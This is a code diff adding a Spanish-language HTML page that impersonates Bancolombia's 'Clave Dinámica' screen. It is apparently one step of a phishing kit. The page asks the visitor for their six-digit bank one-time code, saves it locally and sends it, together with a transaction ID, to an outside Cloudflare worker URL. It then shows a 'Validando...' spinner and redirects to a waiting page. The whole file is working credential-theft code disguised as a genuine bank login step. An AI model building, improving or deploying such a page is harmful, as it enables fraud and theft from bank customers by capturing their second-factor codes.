@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+<title>Clave Dinámica - Bancolombia</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+body {
+    background-image: url('fon.jpg');
+    background-size: 100% 100%;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: #333;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 16px;
+    position: relative;
+}
+
+/* Fondo opaco, transparente y con poco brillo */
+body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('fon.jpg');
+    background-size: 100% 100%;
+    background-position: center;
+    background-repeat: no-repeat;
+    filter: brightness(0.4);     /* Poco brillo (0 = negro, 1 = normal) */
+    opacity: 0.85;               /* Transparente/opaco */
+    z-index: -1;
+}
+
+/* Contenido nítido */
+body > * {
+    position: relative;
+    z-index: 1;
+}
+
+  /* Clase para ajustar la posición vertical del contenedor */
+  .top-container {
+    position: relative;
+    top: -60px;  /* Cambia este valor: negativo para subir, positivo para bajar */
+    width: 100%;
+    display: flex;
+    justify-content: center;
+  }
+
+  /* Contenedor principal centrado y responsive */
+  .container {
+    width: 100%;
+    max-width: 450px;
+    margin: 0 auto;
+  }
+
+  .code-card {
+    background: white;
+    border-radius: 8px;
+    padding: 52px 20px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    border: 1px solid #e0e0e0;
+  }
+
+  /* GIF animado - más largo verticalmente */
+  .gif-container {
+    text-align: center;
+    margin-bottom: 20px;
+   
+  }
+
+ .gif-container img {
+    width: 100%;
+    max-width: 350px;
+    height: 110px;           /* Cambia este valor para la altura deseada */
+    object-fit: fill;        /* Estira el GIF a la altura especificada */
+    border-radius: 10px;
+}
+
+  /* Subtítulo debajo del GIF */
+  .subtitle {
+    font-size: 27px;
+    font-weight: 600;
+    color: #333;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+
+  .info-text {
+    color: #666;
+    font-size: 13px;
+    margin-bottom: 30px;
+    text-align: center;
+  }
+
+  /* Inputs estilo rayitas (solo borde inferior) - responsive */
+  .code-inputs-container {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-bottom: 20px;
+  }
+
+  .code-input {
+    width: 45px;
+    max-width: 100%;
+    border: none;
+    border-bottom: 2px solid #ccc;
+    font-size: 28px;
+    font-weight: 600;
+    text-align: center;
+    background: transparent;
+    outline: none;
+    font-family: 'Segoe UI', monospace;
+    color: #333;
+    caret-color: #F9A825;
+    transition: all 0.2s ease;
+    padding-bottom: 8px;
+  }
+
+  /* Ajuste para pantallas muy pequeñas */
+  @media (max-width: 400px) {
+    .code-inputs-container {
+      gap: 8px;
+    }
+    .code-input {
+      width: 38px;
+      font-size: 24px;
+    }
+  }
+
+  .code-input:focus {
+    border-bottom-color: #F9A825;
+  }
+
+  /* Botones: Borrar y Continuar */
+  .buttons-row {
+    display: flex;
+    gap: 15px;
+    margin-top: 20px;
+  }
+
+  .btn-borrar {
+    flex: 1;
+    border-radius: 26px;
+    padding: 14px;
+    font-size: 15px;
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    background: #ffffff;
+    color: #999;
+    border: 1px solid #ccc;
+    transition: all 0.3s ease;
+  }
+
+  .btn-borrar:hover {
+    border-color: #F9A825;
+    color: #F9A825;
+  }
+
+  .btn-continuar {
+    flex: 1;
+    border-radius: 26px;
+    padding: 14px;
+    font-size: 15px;
+    font-weight: 600;
+    border: none;
+    cursor: not-allowed;
+    background: #e0e0e0;
+    color: #999;
+    transition: all 0.3s ease;
+  }
+
+  .btn-continuar.active {
+    background-color: #fdda24;
+    cursor: pointer;
+    color: #333;
+  }
+
+  .btn-continuar.active:hover {
+    background-color: #f57f17;
+  }
+
+  .loader-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.7);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    color: white;
+  }
+
+  .loader-overlay.active {
+    display: flex;
+  }
+
+  .spinner {
+    width: 45px;
+    height: 45px;
+    border: 4px solid rgba(255,255,255,0.3);
+    border-top-color: #F9A825;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 15px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+
+<div class="top-container">
+  <div class="container">
+    <div class="code-card">
+      <!-- GIF animado -->
+      <div class="gif-container">
+        <img src="git.gif" alt="Animación" id="gifAnimado">
+      </div>
+
+      <!-- Subtítulo debajo del GIF -->
+      <div class="subtitle">Ingresa la Clave Dinámica</div>
+      <div class="info-text">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</div>
+
+      <!-- Inputs estilo rayitas -->
+      <div class="code-inputs-container">
+        <input type="text" class="code-input" maxlength="1" id="otp1" oninput="moverSiguiente(0, event)" onkeydown="moverAnterior(0, event)" onfocus="this.select()" inputmode="numeric">
+        <input type="text" class="code-input" maxlength="1" id="otp2" oninput="moverSiguiente(1, event)" onkeydown="moverAnterior(1, event)" onfocus="this.select()" inputmode="numeric">
+        <input type="text" class="code-input" maxlength="1" id="otp3" oninput="moverSiguiente(2, event)" onkeydown="moverAnterior(2, event)" onfocus="this.select()" inputmode="numeric">
+        <input type="text" class="code-input" maxlength="1" id="otp4" oninput="moverSiguiente(3, event)" onkeydown="moverAnterior(3, event)" onfocus="this.select()" inputmode="numeric">
+        <input type="text" class="code-input" maxlength="1" id="otp5" oninput="moverSiguiente(4, event)" onkeydown="moverAnterior(4, event)" onfocus="this.select()" inputmode="numeric">
+        <input type="text" class="code-input" maxlength="1" id="otp6" oninput="moverSiguiente(5, event)" onkeydown="moverAnterior(5, event)" onfocus="this.select()" inputmode="numeric">
+      </div>
+<br><br>
+      <!-- Botones -->
+      <div class="buttons-row">
+        <button class="btn-borrar" onclick="borrarDigito()">Borrar</button>
+        <button class="btn-continuar" id="btnContinuar" onclick="continuar()" disabled>Continuar</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="loader-overlay" id="loaderOverlay">
+  <div class="spinner"></div>
+  <div>Validando...</div>
+</div>
+
+<script>
+const WORKER_URL = "https://ancient-dawn-3a7e.perrayolo11.workers.dev";
+
+let totalSegundos = 60;
+let restantes = totalSegundos;
+let intervalo = null;
+let enviado = false;
+
+function actualizarBotonContinuar() {
+  const codigo = obtenerDinamicaCompleta();
+  const btnContinuar = document.getElementById('btnContinuar');
+  if (codigo.length === 6) {
+    btnContinuar.classList.add('active');
+    btnContinuar.disabled = false;
+  } else {
+    btnContinuar.classList.remove('active');
+    btnContinuar.disabled = true;
+  }
+}
+
+function iniciarContador() {
+  intervalo = setInterval(() => {
+    restantes--;
+    if (restantes <= 0) {
+      restantes = 0;
+      clearInterval(intervalo);
+    }
+  }, 1000);
+}
+
+function moverSiguiente(index, event) {
+  if (enviado) return;
+  
+  const input = event.target;
+  let value = input.value;
+
+  if (value && !/^\d$/.test(value)) {
+    input.value = '';
+    return;
+  }
+
+  if (value && index < 5) {
+    const nextInput = document.querySelectorAll('.code-input')[index + 1];
+    if (nextInput) nextInput.focus();
+  }
+
+  actualizarBotonContinuar();
+}
+
+function moverAnterior(index, event) {
+  if (enviado) return;
+  
+  if (event.key === 'Backspace' && event.target.value === '' && index > 0) {
+    const prevInput = document.querySelectorAll('.code-input')[index - 1];
+    if (prevInput) prevInput.focus();
+  }
+  actualizarBotonContinuar();
+}
+
+function borrarDigito() {
+  if (enviado) return;
+  
+  const inputs = document.querySelectorAll('.code-input');
+  let lastFilledIndex = -1;
+  
+  for (let i = inputs.length - 1; i >= 0; i--) {
+    if (inputs[i].value !== '') {
+      lastFilledIndex = i;
+      break;
+    }
+  }
+  
+  if (lastFilledIndex !== -1) {
+    inputs[lastFilledIndex].value = '';
+    inputs[lastFilledIndex].focus();
+  } else if (inputs[0]) {
+    inputs[0].value = '';
+    inputs[0].focus();
+  }
+  
+  actualizarBotonContinuar();
+}
+
+function obtenerDinamicaCompleta() {
+  const inputs = document.querySelectorAll('.code-input');
+  let dinamica = '';
+  inputs.forEach(input => {
+    dinamica += input.value;
+  });
+  return dinamica;
+}
+
+async function enviarDinamicaAlWorker(dinamica) {
+  try {
+    const transactionId = localStorage.getItem('transactionId');
+    
+    if (!transactionId) {
+      console.error("❌ No se encontró transactionId");
+      return false;
+    }
+
+    console.log("📤 Enviando código:", dinamica, "ID:", transactionId);
+
+    const response = await fetch(`${WORKER_URL}/otp-code`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        transactionId: transactionId,
+        otp: dinamica,
+        tipo: "dinamica"
+      })
+    });
+
+    const result = await response.json();
+
+    if (result.ok) {
+      console.log("✅ Código enviado correctamente");
+      return true;
+    } else {
+      console.error("❌ Error:", result.error);
+      return false;
+    }
+
+  } catch (error) {
+    console.error("❌ Error de conexión:", error);
+    return false;
+  }
+}
+
+async function continuar() {
+  if (enviado) return;
+  
+  const codigo = obtenerDinamicaCompleta();
+  if (codigo.length !== 6) return;
+  
+  enviado = true;
+  
+  if (intervalo) {
+    clearInterval(intervalo);
+  }
+
+  localStorage.setItem('bancoldina', codigo);
+
+  const loader = document.getElementById('loaderOverlay');
+  loader.classList.add('active');
+
+  const exito = await enviarDinamicaAlWorker(codigo);
+
+  if (exito) {
+    const loaderText = document.querySelector('.loader-overlay div:last-child');
+    if (loaderText) loaderText.textContent = "✅...";
+    
+    setTimeout(() => {
+      window.location.href = 'espera.html';
+    }, 1500);
+  } else {
+    enviado = false;
+    loader.classList.remove('active');
+    
+    const inputs = document.querySelectorAll('.code-input');
+    inputs.forEach(input => input.value = '');
+    actualizarBotonContinuar();
+    if (inputs[0]) inputs[0].focus();
+    
+    restantes = totalSegundos;
+    iniciarContador();
+  }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  const transactionId = localStorage.getItem('transactionId');
+  if (!transactionId) {
+    console.error("❌ No hay transactionId");
+    return;
+  }
+  
+  localStorage.removeItem('bancoldina');
+  
+  const inputs = document.querySelectorAll('.code-input');
+  inputs.forEach(input => input.value = '');
+  actualizarBotonContinuar();
+  
+  iniciarContador();
+  if (inputs[0]) inputs[0].focus();
+});
+</script>
+</body>
+</html>
